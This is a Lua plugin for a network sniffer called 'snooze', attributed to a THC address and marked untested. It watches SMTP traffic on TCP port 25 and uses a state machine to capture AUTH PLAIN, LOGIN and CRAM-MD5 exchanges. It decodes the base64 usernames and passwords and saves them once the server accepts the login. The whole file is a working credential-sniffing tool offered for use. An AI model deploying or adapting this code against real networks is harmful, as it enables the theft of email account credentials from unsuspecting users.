-- :smtp:25:tcp:
-- UNTESTED
-- AUTHOR: rd@thc.org

b = snooze.get()

if b == nil or b == "" then
	snooze.set("AUTH")
	return
end

c = string.sub(b, 1, 4)
b_cut = string.sub(b, 5)

function fn_auth()
	x = snooze.get_server()
	t = string.sub(x, 1, 4)
	if t == "AUTH" then
		_,_,v = string.find(x, "^AUTH ([%w%-]*).*")
		
		if v == "PLAIN" then
			snooze.set("PLAI" .. string.sub(x, 12))
			return
		end
		
		if v == "LOGIN" then
			snooze.set("LOGI")
			return
		end
		
		if v == "CRAM-MD5" then
			snooze.set("CRAM")
			return
		end
	end
end

function fn_plain()
	x = snooze.get_client()
	t = string.sub(x, 1, 3)

	if t == "235" then
		b_cut = utils.base64_decode(b_cut)
		b_cut = string.gsub(b_cut, "%z", " ")
		
		snooze.save("SMTP AUTH PLAIN\n" .. b_cut)
		snooze.finished()
		return
	else
		snooze.set("AUTH")
		return
	end
end

function fn_login()
	x = snooze.get_client()
	t = string.sub(x, 1, 16)

	if t == "334 VXNlcm5hbWU6" then
		snooze.set("LOG2")
		return
	else
		snooze.set("AUTH")
		return
	end
end

function fn_login2()
	x = snooze.get_server()
	snooze.set("LOG3" .. utils.base64_decode(x))
end

function fn_login3()
	x = snooze.get_client()
	t = string.sub(x, 1, 16)

	if t == "334 UGFzc3dvcmQ6" then
		snooze.set("LOG4" .. b_cut)
		return
	else
		snooze.set("AUTH")
		return
	end
end

function fn_login4()
	x = snooze.get_server()
	snooze.set("LOG5" .. b_cut .. "\n" .. utils.base64_decode(x))
end

function fn_login5()
	x = snooze.get_client()
	t = string.sub(x, 1, 3)

	if t == "235" then
		snooze.save("SMTP AUTH LOGIN\n" .. b_cut)
		snooze.finished()
		return
	else
		snooze.set("AUTH")
		return
	end
end

function fn_cram()
	x = snooze.get_client()
	t = string.sub(x, 1, 3)

	if t == "334" then
		snooze.set ("CRA2" .. utils.base64_decode(string.sub(x, 5)))
		return
	else
		snooze.set("AUTH")
		return
	end
end

function fn_cram2()
	x = snooze.get_server()
	snooze.set("CRA3" .. b_cut .. "\n" .. utils.base64_decode(x))
end

function fn_cram3()
	x = snooze.get_client()
	t = string.sub(x, 1, 3)

	if t == "235" then
		snooze.save("SMTP AUTH CRAM-MD5\n" .. b_cut)
		snooze.finished()
		return
	else
		snooze.set("AUTH")
		return
	end
end

state_fns = {
	["AUTH"] = fn_auth,
	["PLAI"] = fn_plain,
	["LOGI"] = fn_login,
	["LOG2"] = fn_login2,
	["LOG3"] = fn_login3,
	["LOG4"] = fn_login4,
	["LOG5"] = fn_login5,
	["CRAM"] = fn_cram,
	["CRA2"] = fn_cram2,
	["CRA3"] = fn_cram3,
}

state_fns[c]()

